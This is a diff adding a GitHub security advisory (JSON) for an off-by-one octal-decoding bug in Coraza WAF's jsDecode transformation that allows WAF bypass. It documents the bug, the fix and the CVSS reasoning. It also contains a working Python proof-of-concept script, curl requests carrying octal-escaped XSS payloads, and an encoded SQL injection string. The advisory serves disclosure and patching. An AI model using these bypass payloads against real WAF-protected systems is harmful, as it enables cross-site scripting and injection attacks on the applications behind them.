@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-pc5q-qfxp-ggqv",
+  "modified": "2026-10-08T18:00:10.402731713Z",
+  "published": "2026-10-08T17:45:53Z",
+  "aliases": [
+    "CVE-2026-104774"
+  ],
+  "summary": "Coraza: jsDecode Off-by-One in Octal Escape Handling Enables WAF Bypass",
+  "details": "### Summary\nThe `t:jsDecode` transformation in Coraza WAF contains an off-by-one error when parsing octal escape sequences. A backslash character was incorrectly included in the octal number buffer, causing `strconv.ParseInt` to fail for every octal escape sequence and return a null byte instead of the decoded value that would normally be returned. This will cause all JS-escaped payloads to be corrupted, thus leading to the bypassing of these WAF rules when WAF rules that rely on `jsDecode` for normalization are enabled.\n\nTherefore, a real-world attack scenario: an attacker could use JavaScript octal escape sequences (`\\ooo`) to encode attack syntax. Although the WAF cannot decode these sequences correctly, the target backend (such as a browser or application) can parse them as expected.\n\n### Details\nVulnerable code: `internal/transformations/js_decode.go:64-70.`\n```go\ncase (i+1 \u003c inputLen) \u0026\u0026 isodigit(input[i+1]):\n    /* \\OOO (only one byte, \\000 - \\377) */\n    buf := make([]byte, 3)\n    j := 0\n\n    for (i+1+j \u003c inputLen) \u0026\u0026 (j \u003c 3) {\n        buf[j] = input[i+j]     // this should be `input[i+1+j]`\n        j++\n        if !isodigit(input[i+j]) {\n            break\n        }\n    }\n```\nThis is because, when entering octal mode, the loop variable `i` points to the backslash character `\\`. Before entering octal mode, the pointer **does not** cross the backslash (unlike in the `\\u` and `\\x` cases, where `i+N` is used as the index). Line 65 uses `input[i+j]`, so when `j=0`, the backslash character itself is copied to `buf[0]`. The subsequent call to `strconv.ParseInt(string(buf), 8, 8)` will fail because `\\` is not a valid octal digit; it therefore returns `0` and raises an error (which is silently suppressed by `_`), resulting in the loss of the bytes that were supposed to be decoded.\n\nFor example, Input `\\163`. The loop starts with `j=0`: `buf[0] = input[i+0] = ‘\\’ ` (the backslash itself). The counter `j` is incremented to 1. Since `isodigit(input[i+1]) = isodigit(‘1’)` is true, the loop continues. When `j=1`: `buf[1] = input[i+1] = ‘1’`. The counter increments to 2; `isodigit(input[i+2]) = isodigit(‘6’)` is true. At this point, `j = 2`: `buf[2] = input[i+2] = ‘6’`. The counter increments to 3, at which point the loop condition `j \u003c 3` is no longer satisfied. Final buffer: `buf = [‘\\’, ‘1’, ‘6’]`. The buffer is truncated when `j = 2` (because `buf[0] = ‘\\’ \u003e ‘3’`), leaving `[‘\\’, ‘1’]`.\n\nThis error affects all octal escape sequences (from `\\000` to `\\377`). Each sequence is decoded and displayed as `0x00` instead of the expected value. For example: `\\377` is normally decoded as `\\xff` or 255\n\n```go\n// Bug: buf = ['\\', '3', '7'] to string(buf) = \"\\\\37\"\nnn, _ = strconv.ParseInt(\"\\\\37\", 8, 8)  // nn = 0\n// Correct: buf = ['3', '7', '7'] = \"377\"\nnn, _ = strconv.ParseInt(\"377\", 8, 8)   // nn = 255 = 0xFF\n```\n\n### PoC\n#### Test Environment\nCoraza WAF v3.7.0 is configured to `127.0.0.1:8090`, `SecRuleEngine` is set to `On`, `SecRequestBodyAccess` is set to `On`, and the complete OWASP CRS rule set has been loaded.\n\n#### PoC Executable Script\n```python\n#!/usr/bin/env python3\nimport urllib.request, sys\n\nTARGET = sys.argv[1] if len(sys.argv) \u003e 1 else \"http://127.0.0.1:8090\"\n\nnormal_url = f\"{TARGET}/?q=%3Cscript%3E\"\noctal_url = f\"{TARGET}/?q=%3C%5C163%5C143%5C162%5C151%5C160%5C164%3E\"\n\nprint(f\"[Normal XSS: {normal_url}\")\ntry:\n    urllib.request.urlopen(normal_url)\n    print(\"  Response: 200 \")\nexcept urllib.error.HTTPError as e:\n    print(f\"  Response: {e.code}\")\n\nprint(f\"\\nBypass JS octal-escaped XSS: {octal_url}\")\ntry:\n    urllib.request.urlopen(octal_url)\n    print(\"  Response: 200 (BYPASS)\")\nexcept urllib.error.HTTPError as e:\n    print(f\"  Response: {e.code}\")\n```\noutput:\n```\n  Normal XSS: http://127.0.0.1:8090/?q=%3Cscript%3E\n  Response: 403\n Bypass JS octal-escaped XSS: http://127.0.0.1:8090/?q=%3C%5C163%5C143%5C162%5C151%5C160%5C164%3E\n  Response: 200 (BYPASS)\n```\n\n#### Proof\n- Normal Test\n```bash\n curl -v -s \"http://127.0.0.1:8090/?q=%3Cscript%3E\"\n\u003c HTTP/1.1 403 Forbidden\n\u003c Date: Wed, 01 Jul 2026 16:09:04 GMT\n```\n- Bypass Test\n```\n curl -v -s \"http://127.0.0.1:8090/?q=%3C%5C163%5C143%5C162%5C151%5C160%5C164%3E\"\n\u003c HTTP/1.1 200 OK\n\u003c Date: Wed, 01 Jul 2026 16:09:04 GMT\n\u003c Content-Length: 39\n\u003c Hello world, transaction not disrupted.\n```\n- Log Proof\n```\n2026/07/01 16:09:04 [DEBUG] Transaction finished tx_id=\"\u003ctxid\u003e\" is_interrupted=false\n```\n\n### Impact\nAttackers can bypass WAFs that rely on the `t:jsDecode` transformation rule, leading to cross-site scripting (XSS), SQL injection, or other malicious activities.\n#### Real-world attack scenarios:\n**SQL injection bypass.** A rule using `t:jsDecode` received `\\47\\117\\122\\40\\61\\75\\61` (i.e., `' OR 1=1`). This octal string decodes to `\\0...`, so the rule did not match the SQL injection pattern.\n\n### Affected Versions\nCoraza WAF v3.0.0 - v3.7.0\n\n### Resolution\nFixed in `internal/transformations/js_decode.go`'s `\\OOO` octal branch, plus two related issues found and fixed while verifying the patch — the actual shipped fix is broader than the single-line change originally proposed:\n\n1. **The reported off-by-one** (`buf[j] = input[i+j]` → `buf[j] = input[i+1+j]`, with the digit-continuation check updated to `input[i+1+j]` accordingly): confirmed and fixed exactly as described above.\n2. **A related high-byte clamping bug in the same branch**: the decoded value was parsed with `strconv.ParseInt(string(buf), 8, 8)` — a *signed* 8-bit parse. Octal values `\\200`-`\\377` (decimal 128-255) exceed the signed int8 range, so even after fixing the indexing bug, those high bytes would still fail to parse and clamp to `0x7f` instead of their real value. Fixed by parsing as unsigned (`strconv.ParseUint(string(buf), 8, 8)`), so the full `\\000`-`\\377` range decodes correctly.\n3. **A related overflow-saturation bug in the sibling `escapeSeqDecode` transformation** (`internal/transformations/escape_seq_decode.go`), discovered while auditing the same octal-parsing pattern elsewhere in the codebase. Unlike `jsDecode`, `escapeSeqDecode`'s indexing was already correct, but it parsed octal values with `strconv.ParseUint(input[i+1:i+j], 8, 8)` — an 8-bit-wide unsigned parse. Since up to 3 octal digits are consumed (`\\0`-`\\777`, i.e. up to decimal 511), any value above `\\377` (255) overflows 8 bits, causing `strconv.ParseUint` to return an error and a saturated value of `0xFF` for every one of those escapes, rather than correctly wrapping to its low byte (mirroring ModSecurity's `strtol(...) \u0026 0xFF` reference behavior). Fixed by widening the parse to 16 bits (`strconv.ParseUint(input[i+1:i+j], 8, 16)`) before truncating to a byte, so `\\400`-`\\777` now wrap to their correct low-byte value instead of all saturating to `0xFF`.\n\nVerified end-to-end: both PoC payloads from this report now decode correctly —\n`\u003c\\163\\143\\162\\151\\160\\164\u003e` → `\u003cscript\u003e`, and `\\47\\117\\122\\40\\61\\75\\61` → `'OR 1=1` — so a downstream WAF rule inspecting the transformed value now sees the real, intended content instead of null bytes or clamped/saturated garbage.\n\nExtensive regression tests were added covering the full octal range (including the `\\200`-`\\377` high-byte range and the `\\400`-`\\777` overflow range for `escapeSeqDecode`), the pre-existing digit-count/truncation edge cases, and both PoC payloads verbatim.\n\n### Mitigation\nUpgrade to the patched release once available. If upgrading isn't immediately possible, the specific code change is:\n\n```go\nfor (i+1+j \u003c inputLen) \u0026\u0026 (j \u003c 3) {\n    buf[j] = input[i+1+j]\n    j++\n    if i+1+j \u003e= inputLen || !isodigit(input[i+1+j]) {\n        break\n    }\n}\n...\nnn, _ := strconv.ParseUint(string(buf), 8, 8)\n```\n\n### Severity (revised 2026-10-02)\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N` (5.8, Medium).\n\nAttack Complexity is Low: JavaScript engines decode legacy octal escapes in non-strict string literals (ECMAScript Annex B), the standard behaviour `jsDecode` emulates, so the request alone triggers the discrepancy. The previous vector (`S:U/C:L/I:L`, 6.5) scored Confidentiality and Integrity separately for what is a single inspection bypass.\n\nImpact metrics follow the convention used across Coraza's WAF-bypass advisories: the vulnerable component is Coraza, but the impact lands on the protected application, so Scope is Changed. The bypass hides a payload from inspection; the application still has to be vulnerable to it, so Integrity is Low and Confidentiality is not scored separately.\n\n_AI involvement in this section: Claude Opus 5.5 (Anthropic), via Claude Code, re-derived the CVSS vector from the project's triage guidance (AGENTS.md, \"CVSS preconditions get verified, not copied from the report\") and drafted this text. A human maintainer (fzipi) chose the `S:C/I:L` impact convention and directed this update._",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/corazawaf/coraza/v3",
+        "purl": "pkg:golang/github.com/corazawaf/coraza/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.8.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-pc5q-qfxp-ggqv/GHSA-pc5q-qfxp-ggqv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/security/advisories/GHSA-pc5q-qfxp-ggqv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/commit/f9b7afdbcedce7ad814663eaee2e342578ea3bb2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/corazawaf/coraza"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/corazawaf/coraza/releases/tag/v3.8.0"
+    }
+  ]
+}
